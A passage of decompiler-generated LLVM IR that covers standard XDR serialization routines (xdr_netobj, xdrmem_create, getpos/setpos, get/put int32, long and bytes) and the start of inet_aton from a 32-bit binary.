  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v6_8057077 = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  %v1_805707f = icmp eq i32 %v6_8057077, 0
  br i1 %v1_805707f, label %dec_label_pc_805710d, label %dec_label_pc_8057087

dec_label_pc_8057087:                             ; preds = %entry
  %v0_8057087 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057087 = inttoptr i32 %v0_8057087 to i32*
  %v2_8057087 = load i32, i32* %v1_8057087, align 4
  store i32 %v2_8057087, i32* @esi, align 4
  %tmp = icmp ugt i32 %v2_8057087, %arg4
  %v0_8057094.pre = load i32, i32* @edi, align 4
  %v1_8057094.phi.trans.insert = inttoptr i32 %v0_8057094.pre to i32*
  %v2_8057094.pre = load i32, i32* %v1_8057094.phi.trans.insert, align 4
  br i1 %tmp, label %dec_label_pc_805708f, label %dec_label_pc_8057094

dec_label_pc_805708f:                             ; preds = %dec_label_pc_8057087
  %v11_805708f = icmp eq i32 %v2_8057094.pre, 2
  %v1_8057092 = icmp eq i1 %v11_805708f, false
  br i1 %v1_8057092, label %dec_label_pc_805710d, label %dec_label_pc_8057094

dec_label_pc_8057094:                             ; preds = %dec_label_pc_8057087, %dec_label_pc_805708f
  %v9_8057096 = icmp eq i32 %v2_8057094.pre, 1
  br i1 %v9_8057096, label %dec_label_pc_80570a4, label %dec_label_pc_805709b

dec_label_pc_805709b:                             ; preds = %dec_label_pc_8057094
  %v5_8057096 = icmp eq i32 %v2_8057094.pre, 0
  br i1 %v5_8057096, label %dec_label_pc_80570d7, label %dec_label_pc_805709d

dec_label_pc_805709d:                             ; preds = %dec_label_pc_805709b
  %v9_805709d = icmp eq i32 %v2_8057094.pre, 2
  %v1_80570a0 = icmp eq i1 %v9_805709d, false
  br i1 %v1_80570a0, label %dec_label_pc_805710d, label %dec_label_pc_80570ef

dec_label_pc_80570a4:                             ; preds = %dec_label_pc_8057094
  %v1_80570a4 = icmp eq i32 %v2_8057087, 0
  br i1 %v1_80570a4, label %dec_label_pc_8057111, label %dec_label_pc_80570a8

dec_label_pc_80570a8:                             ; preds = %dec_label_pc_80570a4
  %v0_80570a8 = load i32, i32* @ebx, align 4
  %v1_80570a8 = icmp eq i32 %v0_80570a8, 0
  %v1_80570aa = icmp eq i1 %v1_80570a8, false
  br i1 %v1_80570aa, label %dec_label_pc_80570d7, label %dec_label_pc_80570ac

dec_label_pc_80570ac:                             ; preds = %dec_label_pc_80570a8
  %v2_80570b0 = call i32 @malloc(i32 %v2_8057087)
  store i32 %v2_80570b0, i32* @ebx, align 4
  %v1_80570ba = load i32, i32* @ebp, align 4
  %v2_80570ba = inttoptr i32 %v1_80570ba to i32*
  store i32 %v2_80570b0, i32* %v2_80570ba, align 4
  %v1_80570bd = icmp eq i32 %v2_80570b0, 0
  %v1_80570bf = icmp eq i1 %v1_80570bd, false
  br i1 %v1_80570bf, label %dec_label_pc_80570ac.dec_label_pc_80570d7_crit_edge, label %dec_label_pc_80570c1

dec_label_pc_80570ac.dec_label_pc_80570d7_crit_edge: ; preds = %dec_label_pc_80570ac
  %v0_80570df.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80570d7

dec_label_pc_80570c1:                             ; preds = %dec_label_pc_80570ac
  %v0_80570c3 = load i32, i32* @global_var_80627d0, align 16
  %v3_80570ce = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_805cba3.314 to i32), i32 %v0_80570c3)
  br label %dec_label_pc_8057108

dec_label_pc_80570d7:                             ; preds = %dec_label_pc_80570ac.dec_label_pc_80570d7_crit_edge, %dec_label_pc_80570a8, %dec_label_pc_805709b
  %v0_80570df = phi i32 [ %v0_80570df.pre, %dec_label_pc_80570ac.dec_label_pc_80570d7_crit_edge ], [ %v0_8057094.pre, %dec_label_pc_80570a8 ], [ %v0_8057094.pre, %dec_label_pc_805709b ]
  %v0_80570db = load i32, i32* @ebx, align 4
  %v2_80570e6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80570e6, i32* @ebx, align 4
  store i32 %v0_8057059, i32* @esi, align 4
  store i32 %v0_8057058, i32* @edi, align 4
  store i32 %v0_8057057, i32* @ebp, align 4
  %v3_80570ea = call i32 @xdr_opaque(i32 %v0_80570df, i32 %v0_80570db, i32 %v2_8057087)
  br label %dec_label_pc_80570ef

dec_label_pc_80570ef:                             ; preds = %dec_label_pc_805709d, %dec_label_pc_80570d7
  %v0_80570ef = load i32, i32* @ebx, align 4
  %v1_80570ef = icmp eq i32 %v0_80570ef, 0
  br i1 %v1_80570ef, label %dec_label_pc_8057111, label %dec_label_pc_80570f3

dec_label_pc_80570f3:                             ; preds = %dec_label_pc_80570ef
  %v2_80570f7 = call i32 @free(i32 %v0_80570ef)
  %v0_80570fc = load i32, i32* @ebp, align 4
  %v1_80570fc = inttoptr i32 %v0_80570fc to i32*
  store i32 0, i32* %v1_80570fc, align 4
  br label %dec_label_pc_8057108

dec_label_pc_8057108:                             ; preds = %dec_label_pc_80570c1, %dec_label_pc_80570f3
  %storemerge = phi i32 [ 1, %dec_label_pc_80570f3 ], [ 0, %dec_label_pc_80570c1 ]
  br label %dec_label_pc_8057116

dec_label_pc_805710d:                             ; preds = %dec_label_pc_805709d, %dec_label_pc_805708f, %entry
  br label %dec_label_pc_8057116

dec_label_pc_8057111:                             ; preds = %dec_label_pc_80570ef, %dec_label_pc_80570a4
  br label %dec_label_pc_8057116

dec_label_pc_8057116:                             ; preds = %dec_label_pc_805710d, %dec_label_pc_8057108, %dec_label_pc_8057111
  %v0_805711d = phi i32 [ 0, %dec_label_pc_805710d ], [ %storemerge, %dec_label_pc_8057108 ], [ 1, %dec_label_pc_8057111 ]
  store i32 %v0_8057059, i32* %esi.global-to-local, align 4
  store i32 %v0_8057058, i32* @edi, align 4
  store i32 %v0_8057057, i32* @ebp, align 4
  ret i32 %v0_805711d

; uselistorder directives
  uselistorder i32 %v2_80570b0, { 0, 2, 1 }
  uselistorder i32 %v2_8057094.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v0_8057094.pre, { 1, 0, 2 }
  uselistorder i32 %v2_8057087, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8057059, { 1, 0 }
  uselistorder i32 %v0_8057058, { 1, 0 }
  uselistorder i32 %v0_8057057, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @xdr_opaque, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8057116, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8057108, { 1, 0 }
  uselistorder label %dec_label_pc_80570ef, { 1, 0 }
  uselistorder label %dec_label_pc_8057094, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_805712b = add i32 %arg2, 4
  %v4_8057133 = inttoptr i32 %arg1 to i32*
  %v5_8057133 = call i32 @xdr_bytes(i32* %v4_8057133, i32 %v1_805712b, i32 %arg2, i32 1024)
  ret i32 %v5_8057133
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  store i32 %tmp4, i32* %edx.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v2_8057148 = add i32 %tmp4, 16
  %v3_8057148 = inttoptr i32 %v2_8057148 to i32*
  store i32 %arg2, i32* %v3_8057148, align 4
  %v0_805714b = load i32, i32* %eax.global-to-local, align 4
  %v1_805714b = load i32, i32* %edx.global-to-local, align 4
  %v2_805714b = inttoptr i32 %v1_805714b to i32*
  store i32 %v0_805714b, i32* %v2_805714b, align 4
  %v0_805714d = load i32, i32* %edx.global-to-local, align 4
  %v1_805714d = add i32 %v0_805714d, 4
  %v2_805714d = inttoptr i32 %v1_805714d to i32*
  store i32 ptrtoint (i32* @global_var_805cbe0.315 to i32), i32* %v2_805714d, align 4
  %v0_8057154 = load i32, i32* @ecx, align 4
  %v1_8057154 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057154 = add i32 %v1_8057154, 12
  %v3_8057154 = inttoptr i32 %v2_8057154 to i32*
  store i32 %v0_8057154, i32* %v3_8057154, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  %v1_805715b = load i32, i32* %edx.global-to-local, align 4
  %v2_805715b = add i32 %v1_805715b, 20
  %v3_805715b = inttoptr i32 %v2_805715b to i32*
  store i32 %arg3, i32* %v3_805715b, align 4
  ret i32 %arg3

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_805715f = load i32, i32* @eax, align 4
  ret i32 %v0_805715f
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8057164 = add i32 %arg1, 12
  %v2_8057164 = inttoptr i32 %v1_8057164 to i32*
  %v3_8057164 = load i32, i32* %v2_8057164, align 4
  %v2_8057167 = add i32 %arg1, 16
  %v3_8057167 = inttoptr i32 %v2_8057167 to i32*
  %v4_8057167 = load i32, i32* %v3_8057167, align 4
  %v5_8057167 = sub i32 %v3_8057164, %v4_8057167
  ret i32 %v5_8057167
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805716b = load i32, i32* @ebx, align 4
  store i32 %v0_805716b, i32* %stack_var_-4, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_8057176 = add i32 %arg1, 20
  %v2_8057176 = inttoptr i32 %v1_8057176 to i32*
  %v3_8057176 = load i32, i32* %v2_8057176, align 4
  store i32 %v3_8057176, i32* %eax.global-to-local, align 4
  %v2_8057179 = add i32 %arg1, 16
  %v3_8057179 = inttoptr i32 %v2_8057179 to i32*
  %v4_8057179 = load i32, i32* %v3_8057179, align 4
  %v5_8057179 = add i32 %v4_8057179, %arg2
  %v2_805717c = add i32 %arg1, 12
  %v3_805717c = inttoptr i32 %v2_805717c to i32*
  %v4_805717c = load i32, i32* %v3_805717c, align 4
  %v5_805717c = add i32 %v4_805717c, %v3_8057176
  store i32 %v5_805717c, i32* %eax.global-to-local, align 4
  %v8_8057181 = icmp slt i32 %v5_805717c, %v5_8057179
  br i1 %v8_8057181, label %dec_label_pc_805718d, label %dec_label_pc_8057183

dec_label_pc_8057183:                             ; preds = %entry
  %v2_8057183 = sub i32 %v5_805717c, %v5_8057179
  store i32 %v2_8057183, i32* %eax.global-to-local, align 4
  store i32 %v5_8057179, i32* %v3_805717c, align 4
  %v0_8057188 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057188 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8057188 = add i32 %v1_8057188, 20
  %v3_8057188 = inttoptr i32 %v2_8057188 to i32*
  store i32 %v0_8057188, i32* %v3_8057188, align 4
  %v0_805718b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805718b = and i32 %v0_805718b, -256
  %v2_805718b = or i32 %v1_805718b, 1
  store i32 %v2_805718b, i32* %ebx.global-to-local, align 4
  %v2_805718f.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805718d

dec_label_pc_805718d:                             ; preds = %entry, %dec_label_pc_8057183
  %v2_805718f = phi i32 [ %v0_805716b, %entry ], [ %v2_805718f.pre, %dec_label_pc_8057183 ]
  %v0_805718d = phi i32 [ 0, %entry ], [ %v2_805718b, %dec_label_pc_8057183 ]
  store i32 %v0_805718d, i32* %eax.global-to-local, align 4
  store i32 %v2_805718f, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805718d

; uselistorder directives
  uselistorder i32 %v0_805718d, { 1, 0 }
  uselistorder i32 %v5_805717c, { 1, 0, 2 }
  uselistorder i32 %v5_8057179, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805718d, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8057191 = load i32, i32* @ebx, align 4
  store i32 %v0_8057191, i32* %stack_var_-4, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v1_805719c = add i32 %arg1, 20
  %v2_805719c = inttoptr i32 %v1_805719c to i32*
  %v3_805719c = load i32, i32* %v2_805719c, align 4
  %v7_805719f = icmp ult i32 %v3_805719c, %arg2
  br i1 %v7_805719f, label %dec_label_pc_80571b1, label %dec_label_pc_80571a3

dec_label_pc_80571a3:                             ; preds = %entry
  %v2_805719f = sub i32 %v3_805719c, %arg2
  %v1_80571a3 = add i32 %arg1, 12
  %v2_80571a3 = inttoptr i32 %v1_80571a3 to i32*
  %v3_80571a3 = load i32, i32* %v2_80571a3, align 4
  store i32 %v3_80571a3, i32* %edx.global-to-local, align 4
  store i32 %v2_805719f, i32* %v2_805719c, align 4
  %v0_80571ab = load i32, i32* %edx.global-to-local, align 4
  %v1_80571ab = load i32, i32* %ebx.global-to-local, align 4
  %v2_80571ab = add i32 %v1_80571ab, %v0_80571ab
  %v1_80571ae = load i32, i32* %ecx.global-to-local, align 4
  %v2_80571ae = add i32 %v1_80571ae, 12
  %v3_80571ae = inttoptr i32 %v2_80571ae to i32*
  store i32 %v2_80571ab, i32* %v3_80571ae, align 4
  %v0_80571b1.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_80571b3.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80571b1

dec_label_pc_80571b1:                             ; preds = %entry, %dec_label_pc_80571a3
  %v2_80571b3 = phi i32 [ %v0_8057191, %entry ], [ %v2_80571b3.pre, %dec_label_pc_80571a3 ]
  %v0_80571b1 = phi i32 [ 0, %entry ], [ %v0_80571b1.pre, %dec_label_pc_80571a3 ]
  store i32 %v2_80571b3, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80571b1

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80571b1, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80571bb = add i32 %arg1, 20
  %v2_80571bb = inttoptr i32 %v1_80571bb to i32*
  %v3_80571bb = load i32, i32* %v2_80571bb, align 4
  %tmp4 = icmp ult i32 %v3_80571bb, 4
  br i1 %tmp4, label %dec_label_pc_80571df, label %dec_label_pc_80571c3

dec_label_pc_80571c3:                             ; preds = %entry
  %v1_80571c3 = add i32 %v3_80571bb, -4
  %v1_80571c6 = add i32 %arg1, 12
  %v2_80571c6 = inttoptr i32 %v1_80571c6 to i32*
  %v3_80571c6 = load i32, i32* %v2_80571c6, align 4
  store i32 %v3_80571c6, i32* %edx.global-to-local, align 4
  store i32 %v1_80571c3, i32* %v2_80571bb, align 4
  %v2_80571d0 = load i32, i32* %arg2, align 4
  %v1_80571d2 = call i32 @llvm.bswap.i32(i32 %v2_80571d0)
  %v1_80571d4 = load i32, i32* %edx.global-to-local, align 4
  %v2_80571d4 = inttoptr i32 %v1_80571d4 to i32*
  store i32 %v1_80571d2, i32* %v2_80571d4, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_80571db = load i32, i32* %ecx.global-to-local, align 4
  %v1_80571db = add i32 %v0_80571db, 12
  %v2_80571db = inttoptr i32 %v1_80571db to i32*
  %v3_80571db = load i32, i32* %v2_80571db, align 4
  %v4_80571db = add i32 %v3_80571db, 4
  store i32 %v4_80571db, i32* %v2_80571db, align 4
  %v0_80571df.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80571df

dec_label_pc_80571df:                             ; preds = %entry, %dec_label_pc_80571c3
  %v0_80571df = phi i32 [ 0, %entry ], [ %v0_80571df.pre, %dec_label_pc_80571c3 ]
  ret i32 %v0_80571df

; uselistorder directives
  uselistorder i32 %v3_80571bb, { 1, 0 }
  uselistorder label %dec_label_pc_80571df, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80571e8 = add i32 %arg1, 20
  %v2_80571e8 = inttoptr i32 %v1_80571e8 to i32*
  %v3_80571e8 = load i32, i32* %v2_80571e8, align 4
  %tmp4 = icmp ult i32 %v3_80571e8, 4
  br i1 %tmp4, label %dec_label_pc_805720c, label %dec_label_pc_80571f0

dec_label_pc_80571f0:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_80571f0 = add i32 %v3_80571e8, -4
  store i32 %v1_80571f0, i32* %v2_80571e8, align 4
  %v0_80571f6 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80571f6 = add i32 %v0_80571f6, 12
  %v2_80571f6 = inttoptr i32 %v1_80571f6 to i32*
  %v3_80571f6 = load i32, i32* %v2_80571f6, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_80571fd = inttoptr i32 %v3_80571f6 to i32*
  %v2_80571fd = load i32, i32* %v1_80571fd, align 4
  %v1_80571ff = call i32 @llvm.bswap.i32(i32 %v2_80571fd)
  store i32 %v1_80571ff, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8057208 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8057208 = add i32 %v0_8057208, 12
  %v2_8057208 = inttoptr i32 %v1_8057208 to i32*
  %v3_8057208 = load i32, i32* %v2_8057208, align 4
  %v4_8057208 = add i32 %v3_8057208, 4
  store i32 %v4_8057208, i32* %v2_8057208, align 4
  %v0_805720c.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805720c

dec_label_pc_805720c:                             ; preds = %entry, %dec_label_pc_80571f0
  %v0_805720c = phi i32 [ 0, %entry ], [ %v0_805720c.pre, %dec_label_pc_80571f0 ]
  ret i32 %v0_805720c

; uselistorder directives
  uselistorder i32 %v3_80571e8, { 1, 0 }
  uselistorder label %dec_label_pc_805720c, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057215 = add i32 %arg1, 20
  %v2_8057215 = inttoptr i32 %v1_8057215 to i32*
  %v3_8057215 = load i32, i32* %v2_8057215, align 4
  %tmp4 = icmp ult i32 %v3_8057215, 4
  br i1 %tmp4, label %dec_label_pc_8057239, label %dec_label_pc_805721d

dec_label_pc_805721d:                             ; preds = %entry
  %v1_805721d = add i32 %v3_8057215, -4
  %v1_8057220 = add i32 %arg1, 12
  %v2_8057220 = inttoptr i32 %v1_8057220 to i32*
  %v3_8057220 = load i32, i32* %v2_8057220, align 4
  store i32 %v3_8057220, i32* %edx.global-to-local, align 4
  store i32 %v1_805721d, i32* %v2_8057215, align 4
  %v2_805722a = load i32, i32* %arg2, align 4
  %v1_805722c = call i32 @llvm.bswap.i32(i32 %v2_805722a)
  %v1_805722e = load i32, i32* %edx.global-to-local, align 4
  %v2_805722e = inttoptr i32 %v1_805722e to i32*
  store i32 %v1_805722c, i32* %v2_805722e, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8057235 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8057235 = add i32 %v0_8057235, 12
  %v2_8057235 = inttoptr i32 %v1_8057235 to i32*
  %v3_8057235 = load i32, i32* %v2_8057235, align 4
  %v4_8057235 = add i32 %v3_8057235, 4
  store i32 %v4_8057235, i32* %v2_8057235, align 4
  %v0_8057239.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057239

dec_label_pc_8057239:                             ; preds = %entry, %dec_label_pc_805721d
  %v0_8057239 = phi i32 [ 0, %entry ], [ %v0_8057239.pre, %dec_label_pc_805721d ]
  ret i32 %v0_8057239

; uselistorder directives
  uselistorder i32 %v3_8057215, { 1, 0 }
  uselistorder label %dec_label_pc_8057239, { 1, 0 }
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8057242 = add i32 %arg1, 20
  %v2_8057242 = inttoptr i32 %v1_8057242 to i32*
  %v3_8057242 = load i32, i32* %v2_8057242, align 4
  %tmp4 = icmp ult i32 %v3_8057242, 4
  br i1 %tmp4, label %dec_label_pc_8057266, label %dec_label_pc_805724a

dec_label_pc_805724a:                             ; preds = %entry
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v1_805724a = add i32 %v3_8057242, -4
  store i32 %v1_805724a, i32* %v2_8057242, align 4
  %v0_8057250 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8057250 = add i32 %v0_8057250, 12
  %v2_8057250 = inttoptr i32 %v1_8057250 to i32*
  %v3_8057250 = load i32, i32* %v2_8057250, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  %v1_8057257 = inttoptr i32 %v3_8057250 to i32*
  %v2_8057257 = load i32, i32* %v1_8057257, align 4
  %v1_8057259 = call i32 @llvm.bswap.i32(i32 %v2_8057257)
  store i32 %v1_8057259, i32* %arg2, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v0_8057262 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8057262 = add i32 %v0_8057262, 12
  %v2_8057262 = inttoptr i32 %v1_8057262 to i32*
  %v3_8057262 = load i32, i32* %v2_8057262, align 4
  %v4_8057262 = add i32 %v3_8057262, 4
  store i32 %v4_8057262, i32* %v2_8057262, align 4
  %v0_8057266.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057266

dec_label_pc_8057266:                             ; preds = %entry, %dec_label_pc_805724a
  %v0_8057266 = phi i32 [ 0, %entry ], [ %v0_8057266.pre, %dec_label_pc_805724a ]
  ret i32 %v0_8057266

; uselistorder directives
  uselistorder i32 %v3_8057242, { 1, 0 }
  uselistorder label %dec_label_pc_8057266, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8057278 = add i32 %arg1, 20
  %v2_8057278 = inttoptr i32 %v1_8057278 to i32*
  %v3_8057278 = load i32, i32* %v2_8057278, align 4
  %v7_805727b = icmp ult i32 %v3_8057278, %arg3
  br i1 %v7_805727b, label %dec_label_pc_805729d, label %dec_label_pc_805727f

dec_label_pc_805727f:                             ; preds = %entry
  %v2_805727b = sub i32 %v3_8057278, %arg3
  store i32 %v2_805727b, i32* %v2_8057278, align 4
  %v0_8057285 = load i32, i32* @esi, align 4
  %v0_805728a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805728a = add i32 %v0_805728a, 12
  %v2_805728a = inttoptr i32 %v1_805728a to i32*
  %v3_805728a = load i32, i32* %v2_805728a, align 4
  %v3_805728d = inttoptr i32 %v3_805728a to i16*
  %v4_805728d = call i32 @memcpy(i16* %v3_805728d, i32 %arg2, i32 %v0_8057285)
  %v1_8057292 = add i32 %v0_805728a, 12
  %v2_8057292 = inttoptr i32 %v1_8057292 to i32*
  %v3_8057292 = load i32, i32* %v2_8057292, align 4
  %v4_8057292 = load i32, i32* @esi, align 4
  %v5_8057292 = add i32 %v4_8057292, %v3_8057292
  store i32 %v5_8057292, i32* %v2_8057292, align 4
  br label %dec_label_pc_805729d

dec_label_pc_805729d:                             ; preds = %entry, %dec_label_pc_805727f
  %v0_80572a0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_805727f ]
  ret i32 %v0_80572a0

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805729d, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80572b0 = add i32 %arg1, 20
  %v2_80572b0 = inttoptr i32 %v1_80572b0 to i32*
  %v3_80572b0 = load i32, i32* %v2_80572b0, align 4
  %v7_80572b3 = icmp ult i32 %v3_80572b0, %arg3
  br i1 %v7_80572b3, label %dec_label_pc_80572d5, label %dec_label_pc_80572b7

dec_label_pc_80572b7:                             ; preds = %entry
  %v2_80572b3 = sub i32 %v3_80572b0, %arg3
  store i32 %v2_80572b3, i32* %v2_80572b0, align 4
  %v0_80572bd = load i32, i32* @esi, align 4
  %v0_80572be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80572be = add i32 %v0_80572be, 12
  %v2_80572be = inttoptr i32 %v1_80572be to i32*
  %v3_80572be = load i32, i32* %v2_80572be, align 4
  %v3_80572c5 = inttoptr i32 %arg2 to i16*
  %v4_80572c5 = call i32 @memcpy(i16* %v3_80572c5, i32 %v3_80572be, i32 %v0_80572bd)
  %v1_80572ca = add i32 %v0_80572be, 12
  %v2_80572ca = inttoptr i32 %v1_80572ca to i32*
  %v3_80572ca = load i32, i32* %v2_80572ca, align 4
  %v4_80572ca = load i32, i32* @esi, align 4
  %v5_80572ca = add i32 %v4_80572ca, %v3_80572ca
  store i32 %v5_80572ca, i32* %v2_80572ca, align 4
  br label %dec_label_pc_80572d5

dec_label_pc_80572d5:                             ; preds = %entry, %dec_label_pc_80572b7
  %v0_80572d8 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_80572b7 ]
  ret i32 %v0_80572d8

; uselistorder directives
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80572d5, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80572e3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80572e3, i32* @ecx, align 4
  %v1_80572e7 = icmp eq i8* %arg1, null
  br i1 %v1_80572e7, label %dec_label_pc_8057368, label %dec_label_pc_80572eb

dec_label_pc_80572eb:                             ; preds = %entry
  %v0_80572f9.pre = load i32, i32* @global_var_8062a20, align 32
  br label %dec_label_pc_80572f6

dec_label_pc_80572f6:                             ; preds = %dec_label_pc_80572eb, %dec_label_pc_805733f
  %v2_805734235 = phi i32 [ 1, %dec_label_pc_80572eb ], [ %v3_8057342, %dec_label_pc_805733f ]
  %v0_80572f634 = phi i32 [ %v4_80572e3, %dec_label_pc_80572eb ], [ %v0_80572f63, %dec_label_pc_805733f ]
  %v0_805735d33 = phi i32 [ 0, %dec_label_pc_80572eb ], [ %v2_8057345, %dec_label_pc_805733f ]
  %v1_80572f6 = inttoptr i32 %v0_80572f634 to i8*
  %v2_80572f6 = load i8, i8* %v1_80572f6, align 1
  %v3_80572f6 = sext i8 %v2_80572f6 to i32
  %v2_80572ff = mul nsw i32 %v3_80572f6, 2
  %v3_80572ff = add i32 %v2_80572ff, %v0_80572f9.pre
  %v4_80572ff = inttoptr i32 %v3_80572ff to i8*
  %v5_80572ff = load i8, i8* %v4_80572ff, align 1
  %v6_80572ff = and i8 %v5_80572ff, 8
  %v7_80572ff = icmp eq i8 %v6_80572ff, 0
  br i1 %v7_80572ff, label %dec_label_pc_8057368, label %dec_label_pc_8057306

dec_label_pc_8057306:                             ; preds = %dec_label_pc_80572f6
  %v4_805731a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805731a

dec_label_pc_805730a:                             ; preds = %dec_label_pc_805731a
  %v3_805730a = mul i32 %v1_805730a, 10
  %v2_805730d = add i32 %v3_805730a, -48
  %v3_805730d = add i32 %v2_805730d, %v2_805731c
  %v1_8057311 = add i32 %v3_805730d, -255
  %v6_8057311 = sub i32 254, %v3_805730d
  %v7_8057311 = and i32 %v6_8057311, %v3_805730d
  %v8_8057311 = icmp slt i32 %v7_8057311, 0
  %v9_8057311 = icmp eq i32 %v1_8057311, 0
  %v10_8057311 = icmp slt i32 %v1_8057311, 0
  %v3_8057317 = icmp eq i1 %v10_8057311, %v8_8057311
  %v4_8057317 = icmp eq i1 %v9_8057311, false
  %v5_8057317 = and i1 %v4_8057317, %v3_8057317
  br i1 %v5_8057317, label %dec_label_pc_8057368, label %dec_label_pc_8057319

dec_label_pc_8057319:                             ; preds = %dec_label_pc_805730a
  %v1_8057319 = add i32 %v0_8057319, 1
  store i32 %v1_8057319, i32* @ecx, align 4
  br label %dec_label_pc_805731a

